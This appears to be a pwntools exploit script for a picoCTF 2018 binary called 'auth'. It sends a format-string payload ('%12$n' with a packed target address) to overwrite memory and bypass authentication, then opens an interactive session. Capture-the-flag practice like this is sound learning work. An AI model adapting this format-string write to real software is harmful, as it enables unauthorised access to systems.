#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('auth')

host = args.HOST or '2018shell2.picoctf.com'
port = int(args.PORT or 52398)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

context.terminal = ['gnome-terminal', '-e']
gdbscript = '''
break *0x080487F9
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

payload = 'AAAA' + p32(0x0804A04C) + '%12$n'

io.sendline(payload)

io.interactive()

